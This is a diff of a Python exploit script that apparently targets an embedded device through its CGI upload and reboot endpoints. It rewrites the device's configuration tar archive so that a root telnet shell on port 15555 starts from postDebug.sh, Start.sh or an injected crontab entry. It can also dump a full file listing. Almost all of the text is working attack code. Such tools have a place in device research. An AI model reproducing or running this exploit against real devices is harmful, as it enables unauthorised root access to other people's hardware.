@@ -22,10 +22,13 @@ import_url = f"http://{hostname}/cgi-bin/support/upload.cgi"
 upload_profile_status_url = f"http://{hostname}/cgi-bin/support/uploadProfileStatus.cgi"
 reboot_url = f"http://{hostname}/cgi-bin/support/reboot_reload.cgi"
 
+list_files = int(os.environ.get('LIST_FILES', '0')) > 0
+inject_crontab = int(os.environ.get('INJECT_CRONTAB', '0')) > 0
 timeout = int(os.environ.get('TIMEOUT', '15'))
 admin_user = os.environ.get('ADMIN_USER','admin')
 add_file = int(os.environ.get('ADD_FILE','1')) > 0
 save_tmp = int(os.environ.get('SAVE_TMP', '0')) > 0
+pwn_2605 = int(os.environ.get('PWN_2605', '0')) > 0
 start_port = 49150
 cnt = 100
 
@@ -94,21 +97,52 @@ profile_data = gzip.decompress(profile_data_gz)
 io_obj = BytesIO()
 io_obj.write(profile_data)
 io_obj.seek(0)
-archive = tarfile.TarFile('profile.tar', mode='a', fileobj=io_obj)
+archive = tarfile.TarFile('profile.tar', mode='r', fileobj=io_obj)
+
+replacement_io = BytesIO()
+replacement_archive = tarfile.TarFile('profile.tar', mode='w', fileobj=replacement_io)
+
+skip_files = set('mnt/mtd/crontab')
+
+if not inject_crontab:
+	if pwn_2605:
+		skip_files.add('mnt/mtd/Start.sh')
+	else:
+		skip_files.add('mnt/mtd/postDebug.sh')
+	
+for member in archive.getmembers():
+	if member.name in skip_files:
+		continue
+	member_data = archive.extractfile(member)
+	replacement_archive.addfile(member, member_data)
+	sys.stdout.write("copied over file %r\n" % (member.name,))
 
 existing_info = archive.getmember('mnt/mtd/acc')
 
 file_data = StringIO()
 file_data.write("#!/bin/sh\n")
+if list_files:
+	file_data.write("/bin/ls -lR / | /bin/gzip > /mnt/mtd/ls.log.gz\n")
 file_data.write("/usr/bin/nohup /usr/sbin/telnetd -F -l /bin/sh -p 15555 </dev/null >/dev/null 2>/dev/null &\n")
+if pwn_2605:
+  file_data.write("exec /etc/Start.sh\n")
 file_data.seek(0)
 file_data = file_data.read().encode('ascii')
 
-binary_file_data = BytesIO()
-file_size = binary_file_data.write(file_data)
-binary_file_data.seek(0)
 
-entry_info = tarfile.TarInfo(name='mnt/mtd/postDebug.sh')
+crontab_data = StringIO()
+if inject_crontab:
+	if list_files:
+		crontab_data.write("*/3\t*\t*\t*\t*\t/bin/ls -lR / | /bin/gzip > /mnt/mtd/ls.log.gz\n")	
+	crontab_data.write("*\t*\t*\t*\t*\t/usr/sbin/telnetd -F -l /bin/sh -p 15555\n")
+	
+crontab_data.seek(0)
+crontab_data = crontab_data.read().encode('ascii')
+
+binary_file_data = BytesIO()
+file_size = binary_file_data.write(crontab_data)
+binary_file_data.seek(0)
+entry_info = tarfile.TarInfo(name='mnt/mtd/crontab')
 
 entry_info.mode = 0o777
 entry_info.uid = existing_info.uid
@@ -120,20 +154,50 @@ entry_info.uname = existing_info.uname
 entry_info.gname = existing_info.gname
 entry_info.devmajor = existing_info.devmajor
 entry_info.devminor = existing_info.devminor
-
 entry_info.chksum = tarfile.calc_chksums(entry_info.tobuf())[0]
 
 if add_file:
-  archive.addfile(entry_info, binary_file_data)
+	if inject_crontab:
+		sys.stdout.write("injecting telnet server into crontab\n")
+	else:
+		sys.stdout.write("injecting crontab with nothing in it\n")
+	replacement_archive.addfile(entry_info, binary_file_data)
 
-archive.close()
+else:
+	binary_file_data = BytesIO()
+	file_size = binary_file_data.write(file_data)
+	binary_file_data.seek(0)
+	path = 'mnt/mtd/postDebug.sh'
+	if pwn_2605:
+		path = 'mnt/mtd/Start.sh'
+	entry_info = tarfile.TarInfo(name=path)
 
-io_obj.seek(0)
-replacement_data_gz = gzip.compress(io_obj.read())
+	entry_info.mode = 0o777
+	entry_info.uid = existing_info.uid
+	entry_info.gid = existing_info.gid
+	entry_info.size = file_size
+	entry_info.mtime = existing_info.mtime
+	entry_info.type = existing_info.type
+	entry_info.uname = existing_info.uname
+	entry_info.gname = existing_info.gname
+	entry_info.devmajor = existing_info.devmajor
+	entry_info.devminor = existing_info.devminor
+
+	entry_info.chksum = tarfile.calc_chksums(entry_info.tobuf())[0]
+
+	if add_file:
+		sys.stdout.write("injecting telnet server into %r\n" % (path,))
+		replacement_archive.addfile(entry_info, binary_file_data)
+
+replacement_archive.close()
+
+replacement_io.seek(0)
+replacement_data_gz = gzip.compress(replacement_io.read())
 
 if not add_file:
   replacement_data_gz = profile_data_gz 
 sys.stdout.write(f"replacement tar file is {len(replacement_data_gz)} bytes\n")
+
 
 if save_tmp:
   with open('/tmp/replacement.tar.gz', 'wb') as fout:
